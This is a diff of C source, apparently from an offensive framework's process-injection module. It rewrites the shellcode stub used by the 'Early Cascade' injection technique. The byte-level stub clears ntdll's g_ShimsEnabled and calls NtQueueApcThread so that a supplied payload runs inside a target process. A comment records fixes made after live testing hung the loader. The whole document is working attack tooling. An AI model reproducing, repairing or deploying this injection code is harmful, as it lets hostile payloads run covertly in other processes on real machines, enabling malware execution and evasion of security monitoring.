@@ -157,38 +157,42 @@ static void ec_build_stub(unsigned char * stub, unsigned char * payload,
                           unsigned char * shimsEnabledSelfForCalc,
                           void * pNtQueueApcThread)
 {
-	int disp;
 	memset(stub, 0xCC, EC_STUB_SIZE);
-	/* mov byte [rip+disp32], 0 - target is in the TARGET process; the stub
-	 * runs there, so rip-relative works if we patch disp to the target's
-	 * g_ShimsEnabled */
-	disp = (int)(long long)(shimsEnabledInTarget - (shimsEnabledSelfForCalc + 6));
-	stub[0] = 0xC6; stub[1] = 0x05;
-	*(int *)(stub + 2) = disp;
-	stub[6] = 0x00;
-	/* mov rax, payload */
-	stub[7] = 0x48; stub[8] = 0xB8;
-	*(unsigned long long *)(stub + 9) = (unsigned long long)(size_t)payload;
-	/* mov rdx, rax */
-	stub[17] = 0x48; stub[18] = 0x89; stub[19] = 0xC2;
+	/* g_ShimsEnabled lives in ntdll (.data) which a heap stub CANNOT reach
+	 * with a rip-rel disp32 - take the absolute address in a register:
+	 *   48 B8 <imm64 shims>   mov rax, g_ShimsEnabled
+	 *   C6 00 00              mov byte [rax], 0
+	 * (live forensics 2026-11-11: rip-rel produced a bogus heap VA and the
+	 *  stub hung the loader in LdrpSendPostSnapNotifications) */
+	stub[0] = 0x48; stub[1] = 0xB8;
+	*(unsigned long long *)(stub + 2) = (unsigned long long)(size_t)shimsEnabledInTarget;
+	stub[10] = 0xC6; stub[11] = 0x00; stub[12] = 0x00;
+	/* mov rcx, payload (ApcRoutine is the 2nd arg = RDX; keep payload in RCX
+	 * and copy below) */
+	stub[13] = 0x48; stub[14] = 0xB9;
+	*(unsigned long long *)(stub + 15) = (unsigned long long)(size_t)payload;
+	/* mov rdx, rcx */
+	stub[23] = 0x48; stub[24] = 0x89; stub[25] = 0xCA;
 	/* xor r8, r8 / xor r9, r9 */
-	stub[20] = 0x4D; stub[21] = 0x31; stub[22] = 0xC0;
-	stub[23] = 0x4D; stub[24] = 0x31; stub[25] = 0xC9;
-	/* sub rsp, 0x20 */
-	stub[26] = 0x48; stub[27] = 0x83; stub[28] = 0xEC; stub[29] = 0x20;
-	/* mov qword [rsp], 0 */
-	stub[30] = 0x48; stub[31] = 0xC7; stub[32] = 0x04; stub[33] = 0x24;
-	*(int *)(stub + 34) = 0;
-	/* mov qword [rsp+8], 0 */
-	stub[38] = 0x48; stub[39] = 0xC7; stub[40] = 0x44; stub[41] = 0x24; stub[42] = 0x08;
-	*(int *)(stub + 43) = 0;
+	stub[26] = 0x4D; stub[27] = 0x31; stub[28] = 0xC0;
+	stub[29] = 0x4D; stub[30] = 0x31; stub[31] = 0xC9;
+	/* sub rsp, 0x28 (keeps 16-byte alignment: entry rsp%16==8, call needs 8) */
+	stub[32] = 0x48; stub[33] = 0x83; stub[34] = 0xEC; stub[35] = 0x28;
+	/* mov qword [rsp], 0 / [rsp+8], 0 */
+	stub[36] = 0x48; stub[37] = 0xC7; stub[38] = 0x04; stub[39] = 0x24;
+	*(int *)(stub + 40) = 0;
+	stub[44] = 0x48; stub[45] = 0xC7; stub[46] = 0x44; stub[47] = 0x24; stub[48] = 0x08;
+	*(int *)(stub + 49) = 0;
+	/* NtQueueApcThread(ThreadHandle=-2 current, ...) - first arg is the
+	 * CURRENT THREAD: mov rcx, -2 */
+	stub[53] = 0x48; stub[54] = 0xC7; stub[55] = 0xC1; *(int *)(stub + 56) = -2;
 	/* mov rax, NtQueueApcThread */
-	stub[47] = 0x48; stub[48] = 0xB8;
-	*(unsigned long long *)(stub + 49) = (unsigned long long)(size_t)pNtQueueApcThread;
-	/* call rax */
-	stub[57] = 0xFF; stub[58] = 0xD0;
-	/* ret */
-	stub[59] = 0xC3;
+	stub[60] = 0x48; stub[61] = 0xB8;
+	*(unsigned long long *)(stub + 62) = (unsigned long long)(size_t)pNtQueueApcThread;
+	/* call rax / ret */
+	stub[70] = 0xFF; stub[71] = 0xD0;
+	stub[72] = 0xC3;
+	(void)shimsEnabledSelfForCalc;
 }
 
 BOOL inject_via_earlycascade(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID lpParameter)
